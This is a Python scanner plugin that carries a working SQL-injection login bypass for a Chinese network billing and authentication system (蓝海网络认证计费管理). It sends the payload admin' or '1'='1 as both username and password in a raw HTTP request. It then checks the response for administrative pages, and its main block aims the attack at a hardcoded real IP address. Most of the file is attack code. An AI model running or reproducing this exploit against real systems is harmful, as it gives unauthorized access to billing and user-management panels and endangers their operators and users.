#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = rabit2013
#_PlugName_ = 蓝海网络认证计费管理万能密码
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0140364
import re
def assign(service, arg):
    if service == 'natshell':
        return True, arg
def audit(arg):
    payload = ''
    target = arg + payload
    raw="""POST /login.php?action=check HTTP/1.1
Host: 222.175.76.90:8888
Content-Length: 440
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://222.175.76.90:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydrjHY65psp3YsROG
Referer: http://222.175.76.90:8888/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-TW;q=0.8,en;q=0.6,ja;q=0.4,es;q=0.2,fr;q=0.2
Cookie: PHPSESSID=5gq4hkeetfvl2ao3lp9c39u1o7

------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="username"

admin\' or \'1\'=\'1
------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="pwd"

admin\' or \'1\'=\'1
------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="x"

52
------WebKitFormBoundarydrjHY65psp3YsROG
Content-Disposition: form-data; name="y"

7
------WebKitFormBoundarydrjHY65psp3YsROG--"""
    code, head, res, errcode, _ = curl.curl2(target, raw=raw)
    if code == 200 and "recharge_user.php" in res and 'user_bill.php' in res:
        security_note(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('natshell', 'http://222.175.76.90:8888/')[1])